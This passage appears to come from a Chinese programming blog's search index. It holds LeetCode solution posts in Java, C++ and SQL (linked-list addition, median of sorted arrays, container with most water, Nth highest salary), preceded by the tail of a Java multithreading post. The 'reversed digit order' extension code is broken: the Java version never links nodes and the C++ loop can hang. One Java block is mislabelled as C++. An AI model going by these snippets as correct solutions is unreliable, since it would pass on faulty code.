<td>this.name = name</td>
<td>“Bobby”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>check()</td>
<td>“Bob”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>释放锁</td>
<td></td>
<td></td>
</tr>
<tr>
<td>获取锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>this.count++</td>
<td></td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>check()</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>释放锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>## 参考</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>《图解Java多线程设计模式》</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>Single Threaded Execution模式</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>2. 两数相加</title>
    <url>/2018/08/30/LeetCode/leetcode-000002-%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个非空链表来表示两个非负整数。位数按照逆序方式存储，它们的每个节点只存储单个数字。将两数相加返回一个新的链表。</p>
<p>你可以假设除了数字 0 之外，这两个数字都不会以零开头。</p>
<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">原因：342 + 465 &#x3D; 807</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：模拟竖式加法"><a href="#解法一：模拟竖式加法" class="headerlink" title="解法一：模拟竖式加法"></a>解法一：模拟竖式加法</h3><p>竖式加法就是从最低位一位一位往最高位加，如果有进位的话，再加上这个进位。此处模拟这个过程即可。不过需要注意的，<strong>两个列表未必是长度相同的</strong>。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		ListNode tmp = <span class="keyword">null</span>;</span><br><span class="line">	    ListNode result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">while</span> (l1 != <span class="keyword">null</span> || l2 != <span class="keyword">null</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">	        <span class="keyword">int</span> sum = (l1 == <span class="keyword">null</span> ? <span class="number">0</span> : l1.val) + (l2 == <span class="keyword">null</span> ? <span class="number">0</span> : l2.val) + carry;</span><br><span class="line">	        carry = sum / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	        ListNode node = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">	        <span class="keyword">if</span> (tmp == <span class="keyword">null</span>) &#123;</span><br><span class="line">	            tmp = node;</span><br><span class="line">	            result = tmp;</span><br><span class="line">	        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	            tmp.next = node;</span><br><span class="line">	            tmp = tmp.next;</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line">	        l1 = l1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : l1.next;</span><br><span class="line">	        l2 = l2 == <span class="keyword">null</span> ? <span class="keyword">null</span> : l2.next;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span> </span>&#123;</span><br><span class="line">        ListNode* result = <span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode* pre = result;</span><br><span class="line">        ListNode *pa = l1, *pb = l2;</span><br><span class="line">        <span class="keyword">int</span> carry =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(pa!=<span class="literal">NULL</span> || pb!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> av = pa == <span class="literal">NULL</span>? <span class="number">0</span>:pa-&gt;val;</span><br><span class="line">            <span class="keyword">int</span> bv = pb == <span class="literal">NULL</span>? <span class="number">0</span>:pb-&gt;val;</span><br><span class="line">            ListNode* node = <span class="keyword">new</span> ListNode((av+bv+carry)%<span class="number">10</span>);</span><br><span class="line">            carry = (av+bv+carry)/<span class="number">10</span>;</span><br><span class="line">            pre-&gt;next = node;</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">            pa = pa==<span class="literal">NULL</span>? <span class="literal">NULL</span>:pa-&gt;next;</span><br><span class="line">            pb = pb==<span class="literal">NULL</span>? <span class="literal">NULL</span>:pb-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt;<span class="number">0</span>)&#123;</span><br><span class="line">            pre-&gt;next = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = result-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> result;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>如果，保存的位顺序是反的呢？</p>
<p>比如： 342+465=807</p>
<p>(3→4→2)+(4→6→5)=8→0→7</p>
<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>按照顺序每位相加。完成之后，用两个指针（一个保存头指针p1，一个保存头指针后一个p2），从头开始遍历列表，判断p2是否大于等于10，是的话，p1对应的值，加一。然后顺移一位，直到最后。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbersReverse</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		ListNode result = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != l1 || <span class="keyword">null</span> != l2) &#123;</span><br><span class="line">			ListNode node = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">null</span> == l1) &#123;</span><br><span class="line">				node.val = l2.val;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">null</span> == l2) &#123;</span><br><span class="line">				node.val = l1.val;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				node.val = l1.val + l2.val;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">null</span> != l1) &#123;</span><br><span class="line">				l1 = l1.next;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">null</span> != l2) &#123;</span><br><span class="line">				l2 = l2.next;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ListNode p1 = result;</span><br><span class="line">			ListNode p2 = result.next;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">null</span> != p2) &#123;</span><br><span class="line">				<span class="keyword">if</span> (p2.val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">					p1.val += <span class="number">1</span>;</span><br><span class="line">					p2.val -= <span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				p1 = p2;</span><br><span class="line">				p2 = p2.next;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (result.val == <span class="number">0</span>) &#123;</span><br><span class="line">				result = result.next;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">addTwoNumbersReverse</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* result = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (l1 || l2) &#123;</span><br><span class="line">            ListNode* node = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">nullptr</span> == l1) &#123;</span><br><span class="line">                node-&gt;val = l2-&gt;val;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">nullptr</span> == l2) &#123;</span><br><span class="line">                node-&gt;val = l1-&gt;val;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node-&gt;val = l1-&gt;val + l2-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            result-&gt;next = node;</span><br><span class="line">            <span class="keyword">if</span> (l1) &#123;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2) &#123;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* p1 = result;</span><br><span class="line">        ListNode* p2 = result-&gt;next; 	</span><br><span class="line">        <span class="keyword">while</span> (p2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p2-&gt;val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">                p1-&gt;val += <span class="number">1</span>;</span><br><span class="line">                p2-&gt;val -= <span class="number">10</span>;</span><br><span class="line">                p1 = p2;</span><br><span class="line">                p2 = p2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果都没有进位，去除前导0</span></span><br><span class="line">        <span class="keyword">if</span> (!result-&gt;val) &#123;</span><br><span class="line">            result = result-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>4. 两个排序数组的中位数</title>
    <url>/2018/08/30/LeetCode/leetcode-000004-%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个大小为 m 和 n 的有序数组 nums1 和 nums2 。</p>
<p>请找出这两个有序数组的中位数。要求算法的时间复杂度为 O(log (m+n)) 。</p>
<p>你可以假设 nums1 和 nums2 不同时为空。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nums1 &#x3D; [1, 3]</span><br><span class="line">nums2 &#x3D; [2]</span><br><span class="line"></span><br><span class="line">中位数是 2.0</span><br></pre></td></tr></table></figure>

<h2 id="示例1：-1"><a href="#示例1：-1" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nums1 &#x3D; [1, 2]</span><br><span class="line">nums2 &#x3D; [3, 4]</span><br><span class="line"></span><br><span class="line">中位数是 (2 + 3)&#x2F;2 &#x3D; 2.5</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将两个数组排序成一个数组，然后求它们的中位数。因为数组是有序的，所以可以遍历一趟得到结果。算法复杂度为<strong>O(max(m,n))</strong>,与题目要求的不符。</p>
<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> length1 = nums1.length;</span><br><span class="line">		<span class="keyword">int</span> length2 = nums2.length;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[length1 + length2];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums1[index1] &lt; nums2[index2]) &#123;</span><br><span class="line">        		result[index] = nums1[index1];</span><br><span class="line">        		index1++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[index1] &gt; nums2[index2]) &#123;</span><br><span class="line">        		result[index] = nums2[index2];</span><br><span class="line">        		index2++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		result[index++] = nums1[index1];</span><br><span class="line">        		result[index] = nums1[index1];</span><br><span class="line">        		index1++;</span><br><span class="line">        		index2++;</span><br><span class="line">        	&#125;</span><br><span class="line">        	index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1) &#123;</span><br><span class="line">        	result[index++] = nums1[index1++];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (index2 &lt; length2) &#123;</span><br><span class="line">        	result[index++] = nums2[index2++];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (result.length % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (result[result.length / <span class="number">2</span>] + result[result.length / <span class="number">2</span> - <span class="number">1</span>]) / <span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        	<span class="keyword">return</span> result[result.length / <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findKth</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> m, <span class="keyword">int</span> b[], <span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span> (m &gt; n)</span><br><span class="line">	    	<span class="keyword">return</span> findKth(b, n, a, m, k);</span><br><span class="line">	    <span class="keyword">if</span> (m == <span class="number">0</span>)</span><br><span class="line">	    	<span class="keyword">return</span> b[k - <span class="number">1</span>];</span><br><span class="line">	    <span class="keyword">if</span> (k == <span class="number">1</span>)</span><br><span class="line">	    	<span class="keyword">return</span> min(a[<span class="number">0</span>], b[<span class="number">0</span>]);</span><br><span class="line">	    <span class="comment">//divide k into two parts</span></span><br><span class="line">	    <span class="keyword">int</span> pa = min(k / <span class="number">2</span>, m), pb = k - pa;</span><br><span class="line">	    <span class="keyword">if</span> (a[pa - <span class="number">1</span>] &lt; b[pb - <span class="number">1</span>])</span><br><span class="line">	    	<span class="keyword">return</span> findKth(a + pa, m - pa, b, n, k - pa);</span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (a[pa - <span class="number">1</span>] &gt; b[pb - <span class="number">1</span>])</span><br><span class="line">	    	<span class="keyword">return</span> findKth(a, m, b + pb, n - pb, k - pb);</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">		    <span class="keyword">return</span> a[pa - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> m, <span class="keyword">int</span> B[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> total = m + n;</span><br><span class="line">		<span class="keyword">if</span> (total &amp; <span class="number">0x1</span>)</span><br><span class="line">			<span class="keyword">return</span> findKth(A, m, B, n, total / <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> (findKth(A, m, B, n, total / <span class="number">2</span>)</span><br><span class="line">					+ findKth(A, m, B, n, total / <span class="number">2</span> + <span class="number">1</span>)) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>11. 盛最多水的容器</title>
    <url>/2018/08/30/LeetCode/leetcode-000011-%E7%9B%9B%E6%9C%80%E5%A4%9A%E6%B0%B4%E7%9A%84%E5%AE%B9%E5%99%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定 n 个非负整数 a1，a2，…，an，每个数代表坐标中的一个点 (i, ai) 。在坐标内画 n 条垂直线，垂直线 i 的两个端点分别为 (i, ai) 和 (i, 0)。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。</p>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>你不能倾斜容器，且 n 的值至少为 2。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000011.jpg" alt="示例"></p>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出: 49</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p><a href="https://leetcode-cn.com/problems/container-with-most-water/solution/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/container-with-most-water/solution/</a></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> right = height.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">        max = Math.max(max,Math.min(height[left], height[right]) * (right - left));</span><br><span class="line">        <span class="keyword">if</span>(height[left] &lt; height[right]) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = height.size() - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(right &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">int</span> area = (right - left) * (height[left] &gt;= height[right] ? height[right] : height[left]);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(area &gt; maxArea) &#123;</span><br><span class="line">                maxArea = area;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(height[left] &lt; height[right]) &#123;</span><br><span class="line">                left ++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right --;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>176. 第二高的薪水</title>
    <url>/2018/08/30/LeetCode/leetcode-000176.%20%E7%AC%AC%E4%BA%8C%E9%AB%98%E7%9A%84%E8%96%AA%E6%B0%B4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，获取 <code>Employee</code> 表中第二高的薪水（Salary） 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+--------+</span><br><span class="line">| Id | Salary |</span><br><span class="line">+----+--------+</span><br><span class="line">| 1  | 100    |</span><br><span class="line">| 2  | 200    |</span><br><span class="line">| 3  | 300    |</span><br><span class="line">+----+--------+</span><br></pre></td></tr></table></figure>
<p>例如上述 <code>Employee</code> 表，SQL查询应该返回 <code>200</code> 作为第二高的薪水。如果不存在第二高的薪水，那么查询应返回 <code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">| SecondHighestSalary |</span><br><span class="line">+---------------------+</span><br><span class="line">| 200                 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">Max</span>(Salary)  SecondHighestSalary</span><br><span class="line"><span class="keyword">from</span> Employee <span class="keyword">where</span> (<span class="keyword">select</span> <span class="keyword">Max</span>(Salary)<span class="keyword">from</span> Employee) &gt; Salary</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>177. 第N高的薪水</title>
    <url>/2018/08/30/LeetCode/leetcode-000177.%20%E7%AC%ACN%E9%AB%98%E7%9A%84%E8%96%AA%E6%B0%B4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，获取 <code>Employee</code> 表中第 n 高的薪水（Salary）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+--------+</span><br><span class="line">| Id | Salary |</span><br><span class="line">+----+--------+</span><br><span class="line">| 1  | 100    |</span><br><span class="line">| 2  | 200    |</span><br><span class="line">| 3  | 300    |</span><br><span class="line">+----+--------+</span><br></pre></td></tr></table></figure>
<p>例如上述 <code>Employee</code> 表，n = 2 时，应返回第二高的薪水 <code>200</code>。如果不存在第 n 高的薪水，那么查询应返回 <code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------------+</span><br><span class="line">| getNthHighestSalary(2) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 200                    |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> getNthHighestSalary(N <span class="built_in">INT</span>) <span class="keyword">RETURNS</span> <span class="built_in">INT</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">declare</span> m <span class="built_in">int</span>;</span><br><span class="line"><span class="keyword">SET</span> m = N - <span class="number">1</span>;</span><br><span class="line">  RETURN (</span><br><span class="line">      <span class="keyword">select</span> <span class="keyword">distinct</span> Salary <span class="keyword">from</span> Employee <span class="keyword">order</span> <span class="keyword">by</span> Salary <span class="keyword">desc</span> <span class="keyword">limit</span> m, <span class="number">1</span></span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>191. 位1的个数</title>
    <url>/2018/08/30/LeetCode/leetcode-000191.%20%E4%BD%8D1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，输入是一个无符号整数，返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为汉明重量）</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 11</span><br><span class="line">输出: 3</span><br><span class="line">解释: 整数 11 的二进制表示为 00000000000000000000000000001011</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 128</span><br><span class="line">输出: 1</span><br><span class="line">解释: 整数 128 的二进制表示为 00000000000000000000000010000000</span><br></pre></td></tr></table></figure>
